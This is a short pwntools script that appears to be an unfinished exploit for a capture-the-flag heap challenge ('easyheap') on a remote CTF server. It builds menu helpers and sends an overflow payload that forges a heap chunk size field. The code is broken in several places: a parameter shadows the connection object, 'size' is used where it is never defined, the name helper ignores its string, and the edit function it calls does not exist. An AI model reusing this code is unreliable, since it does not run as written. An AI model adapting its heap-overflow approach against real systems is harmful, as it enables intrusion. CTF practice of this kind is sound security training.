# -*- coding: utf-8 -*-
from pwn import *
elf_file = FILENAME = './easyheap'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = 'node4.buuoj.cn'
POST = 28317
libc = ELF("./libc-2.23.so")
'''
HOST = 'localhost'
POST = 7777
libc = ELF("./libc.so.6")
#libc = ELF("./libc6-amd64_2.27-3ubuntu1_i386/data/lib64/libc.so.6")
'''
c = remote(HOST, POST)


def create(index,c):
  c.sendlineafter('command?\n>','1')
  c.sendlineafter('index?\n> ',str(size))
  c.sendlineafter('color?(bay|chestnut|gray)\n>',str(c))

def name(index,size,s):
  c.sendlineafter('command?\n>','2')
  c.sendlineafter('index?\n> ',str(size))

def show(index):
  c.sendlineafter('command?\n>','3')
  c.sendlineafter('index?\n> ',str(size))

# 4: dance
def delete():
  c.sendlineafter('command?\n>','5')
  c.sendlineafter('index?\n> ',str(size))
# 6: end
create(0,'gray')
create(1,'gray')

payload = '\x00'*0x20 
payload+= p64(0x21)
edit(0,40,payload)
#delete(1)

c.interactive()